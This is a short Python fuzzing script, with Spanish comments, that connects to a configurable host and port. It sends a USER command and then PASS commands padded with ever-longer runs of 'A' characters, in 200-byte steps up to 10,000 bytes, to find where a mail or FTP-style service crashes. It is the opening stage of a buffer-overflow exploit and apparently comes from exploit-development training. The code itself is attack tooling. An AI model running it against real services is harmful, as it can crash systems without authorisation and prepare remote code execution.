#!/usr/bin/python3
import socket, sys, time
from parameters import rhost, rport, timeout
from colors import colors

buffer = []
cantidadFuzzing = 50
aumentoFuzzing = 200

# configuración de fuzzing
while len(buffer) < cantidadFuzzing:
    buffer.append(b'A' * aumentoFuzzing)
    aumentoFuzzing += 200

# conexión
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
s.connect((rhost, rport))
s.recv(1024)

# fuzzing
for caracteres in buffer:
    try:        
        print(colors.Green + '\nRealizando fuzzing con %s bytes...' % len(caracteres) + colors.End)

        # usuario
        s.send(b'USER MrW0l05zyn\r\n')
        s.recv(1024)
        # password
        s.send(b'PASS ' + caracteres + b'\r\n')
        s.recv(1024)

    except Exception as error:
        print(colors.Red + '\n[!] Ha ocurrido un error:', str(error) + colors.End)
        sys.exit(0)
    time.sleep(2)

# cierre de conexión
s.send(b"QUIT\r\n")
s.recv(1024)
s.close()